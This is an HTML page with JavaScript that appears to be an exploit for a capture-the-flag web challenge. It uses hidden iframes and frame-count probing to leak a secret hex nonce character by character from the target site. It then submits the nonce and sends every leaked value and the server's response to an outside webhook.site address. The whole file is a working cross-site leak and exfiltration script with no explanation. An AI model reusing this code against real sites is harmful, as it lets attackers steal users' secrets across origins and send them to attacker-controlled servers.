<!DOCTYPE html>
<html><body>
<div id="f"></div>
<script>
const CHALL = 'https://notes.chall.lac.tf';
const WH = 'https://webhook.site/fcbfa7b7-f8f2-42d2-9c53-6f33f061d36d';
const HEX = '0123456789abcdef';

function exfil(d){ new Image().src = WH + '?d=' + encodeURIComponent(d); }

function testOne(prefix) {
    return new Promise(resolve => {
        const v = document.createElement('iframe');
        v.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
        document.getElementById('f').appendChild(v);
        let done = false;
        function fin(r) { if(done) return; done = true; try{v.remove();}catch(e){} resolve(r); }
        const to = setTimeout(() => fin(false), 12000);

        v.onload = () => {
            setTimeout(() => {
                let t = 0;
                try { t = v.contentWindow.length; } catch(e) { clearTimeout(to); fin(false); return; }
                if (t === 0) {
                    setTimeout(() => {
                        try { t = v.contentWindow.length; } catch(e) {}
                        if (t === 0) { clearTimeout(to); fin(false); return; }
                        go(t);
                    }, 800);
                } else go(t);

                function go(total) {
                    for (let i = 0; i < total; i++) {
                        try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
                    }
                    // KEY: wait 2s for about:blank to fully settle in all frames
                    setTimeout(() => {
                        let blk = 0;
                        for (let i = 0; i < total; i++) {
                            try { v.contentWindow.frames[i].document; } catch(e) { blk++; }
                        }
                        clearTimeout(to);
                        fin(blk >= 1);
                    }, 2000);
                }
            }, 300);
        };
        v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(prefix);
    });
}

// Race: resolve on first match, but with reliable timing
function findChar(nonce) {
    return new Promise(resolve => {
        let found = false;
        let done = 0;
        HEX.split('').forEach(c => {
            testOne(nonce + c).then(match => {
                if (match && !found) { found = true; resolve(c); }
                done++;
                if (done === 16 && !found) resolve(null);
            });
        });
    });
}

(async () => {
    exfil('go');
    let nonce = '';
    for (let p = 0; p < 8; p++) {
        const c = await findChar(nonce);
        if (c) {
            nonce += c;
            exfil('p' + p + '=' + c + '_' + nonce);
        } else {
            exfil('m' + p);
            p--;
        }
    }
    exfil('n=' + nonce);
    try {
        const r = await fetch(CHALL + '/guess?nonce=' + nonce);
        const t = await r.text();
        exfil('R=' + t);
    } catch(e) { exfil('E=' + e.message.substring(0,40)); }
})();
</script></body></html>
